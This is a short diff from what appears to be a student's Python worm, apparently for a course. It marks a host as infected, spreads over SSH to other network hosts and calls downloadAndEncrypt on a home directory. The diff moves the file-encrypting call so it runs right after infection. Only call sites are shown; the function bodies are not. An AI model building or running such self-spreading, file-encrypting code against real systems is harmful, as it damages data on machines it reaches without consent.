@@ -259,6 +259,7 @@ if len(sys.argv) < 2:
 		sys.exit()
 	else:
 		markInfected()
+		downloadAndEncrypt("/home/cpsc/")
 # TODO: Get the IP of the current system
 
 
@@ -295,7 +296,7 @@ for host in networkHosts:
 		except IOError:
 			print "This system should be infected"
 			spreadAndExecute(sshInfo[0])
-			downloadAndEncrypt(localpath)
+			
 
 		# TODO: Check if the system was	
 		# already infected. This can be
